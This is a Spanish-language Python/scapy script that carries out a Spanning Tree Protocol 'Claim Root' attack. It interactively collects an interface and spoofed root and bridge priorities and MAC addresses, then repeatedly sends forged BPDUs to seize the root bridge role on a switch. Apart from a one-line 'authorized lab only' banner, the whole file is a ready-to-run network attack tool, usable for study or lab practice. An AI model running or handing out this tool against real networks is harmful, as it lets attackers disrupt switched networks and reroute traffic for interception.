import os
import random
import signal
import subprocess
import sys
import time

from scapy.all import Dot3, LLC, STP, conf, get_if_hwaddr, sendp

running = True


def stop_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)


def require_root():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("Ejecuta este script con sudo")
        sys.exit(1)


def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception:
        return ""


def list_interfaces():
    return [iface for iface in sorted(os.listdir("/sys/class/net")) if iface != "lo"]


def get_interface_info(iface):
    info = run_cmd(["ip", "-br", "addr", "show", iface])
    return info if info else iface


def choose_interface():
    interfaces = list_interfaces()

    if not interfaces:
        print("No se encontraron interfaces de red")
        sys.exit(1)

    print("")
    print("Interfaces disponibles:")
    print("")

    for index, iface in enumerate(interfaces, 1):
        print(f"{index}. {get_interface_info(iface)}")

    print("")

    default_iface = "eth0" if "eth0" in interfaces else interfaces[0]

    while True:
        value = input(f"Interfaz conectada al switch [Enter = {default_iface}]: ").strip()

        if value == "":
            return default_iface

        if value.isdigit():
            number = int(value)

            if 1 <= number <= len(interfaces):
                return interfaces[number - 1]

        if value in interfaces:
            return value

        print("Interfaz inválida")


def ask_int(label, default_value, minimum, maximum):
    while True:
        value = input(f"{label} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        try:
            number = int(value)
        except Exception:
            print("Valor inválido")
            continue

        if minimum <= number <= maximum:
            return number

        print(f"El valor debe estar entre {minimum} y {maximum}")


def ask_float(label, default_value, minimum, maximum):
    while True:
        value = input(f"{label} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        try:
            number = float(value)
        except Exception:
            print("Valor inválido")
            continue

        if minimum <= number <= maximum:
            return number

        print(f"El valor debe estar entre {minimum} y {maximum}")


def ask_mac(label, default_value):
    while True:
        value = input(f"{label} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        parts = value.split(":")

        if len(parts) != 6:
            print("MAC inválida")
            continue

        valid = True

        for part in parts:
            if len(part) != 2:
                valid = False
                break

            try:
                int(part, 16)
            except Exception:
                valid = False
                break

        if valid:
            return value.lower()

        print("MAC inválida")


def wait_enter():
    print("")
    input("Presiona Enter para iniciar el ataque en el laboratorio")


def build_bpdu(src_mac, root_priority, root_mac, bridge_priority, bridge_mac, port_id):
    packet = (
        Dot3(dst="01:80:c2:00:00:00", src=src_mac)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / STP(
            proto=0,
            version=0,
            bpdutype=0,
            bpduflags=0,
            rootid=root_priority,
            rootmac=root_mac,
            pathcost=0,
            bridgeid=bridge_priority,
            bridgemac=bridge_mac,
            portid=port_id,
            age=0,
            maxage=20,
            hellotime=2,
            fwddelay=15,
        )
    )

    return packet


def main():
    require_root()

    print("")
    print("STP Claim Root Attack")
    print("Usar solamente en laboratorio autorizado")
    print("")

    iface = choose_interface()
    interval = ask_float("Pausa entre BPDUs en segundos", 1.0, 0.1, 10)
    duration = ask_int("Duración en segundos, 0 es infinito", 0, 0, 86400)
    root_priority = ask_int("Prioridad Root Bridge falsa", 0, 0, 65535)
    bridge_priority = ask_int("Prioridad Bridge falsa", 0, 0, 65535)
    root_mac = ask_mac("MAC falsa del Root Bridge", "00:00:00:00:00:01")
    bridge_mac = ask_mac("MAC falsa del Bridge atacante", "00:00:00:00:00:01")
    port_id = ask_int("Port ID anunciado", 32769, 1, 65535)

    try:
        real_mac = get_if_hwaddr(iface)
    except Exception:
        print(f"No pude obtener la MAC de {iface}")
        sys.exit(1)

    conf.iface = iface
    conf.verb = 0

    print("")
    print("Configuración seleccionada:")
    print(f"Interfaz: {iface}")
    print(f"Info interfaz: {get_interface_info(iface)}")
    print(f"MAC real atacante: {real_mac}")
    print(f"Root Priority falsa: {root_priority}")
    print(f"Root MAC falsa: {root_mac}")
    print(f"Bridge Priority falsa: {bridge_priority}")
    print(f"Bridge MAC falsa: {bridge_mac}")
    print(f"Port ID: {port_id}")
    print(f"Pausa: {interval}")
    print(f"Duración: {duration if duration > 0 else 'infinita'}")

    wait_enter()

    packet = build_bpdu(
        real_mac,
        root_priority,
        root_mac,
        bridge_priority,
        bridge_mac,
        port_id,
    )

    print("")
    print("Ataque iniciado")
    print("Presiona Ctrl+C para detener")
    print("")

    sent = 0
    start_time = time.time()
    end_time = start_time + duration if duration > 0 else 0

    while running:
        if end_time and time.time() >= end_time:
            break

        sendp(packet, iface=iface, verbose=False)
        sent += 1

        elapsed = time.time() - start_time
        print(f"BPDUs enviados={sent} tiempo={elapsed:.1f}s")

        time.sleep(interval)

    elapsed = time.time() - start_time

    print("")
    print("Resumen:")
    print(f"BPDUs enviados: {sent}")
    print(f"Tiempo total: {elapsed:.1f} segundos")
    print("")
    print("Finalizado")


if __name__ == "__main__":
    main()
